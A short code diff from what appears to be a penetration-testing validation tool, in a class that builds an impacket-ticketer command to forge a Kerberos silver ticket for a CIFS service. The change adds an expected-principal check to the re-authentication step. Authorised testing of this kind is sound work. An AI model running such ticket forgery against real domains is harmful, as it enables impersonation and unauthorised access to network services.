@@ -97,7 +97,8 @@ class SilverTicketExecutor(ValidationExecutor):
         forge_argv = ["impacket-ticketer", key_flag(kind), key, "-domain-sid", sid,
                       "-domain", cfg.domain, "-spn", f"cifs/{host}",
                       "-user-id", v["user_id"], forged]
-        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, host, out_dir)
+        ok, fsteps, ferrors = forge_and_reauth(ctx, forge_argv, forged, host, out_dir,
+                                               expect_principal=forged)
         steps += fsteps
         errors += ferrors
 
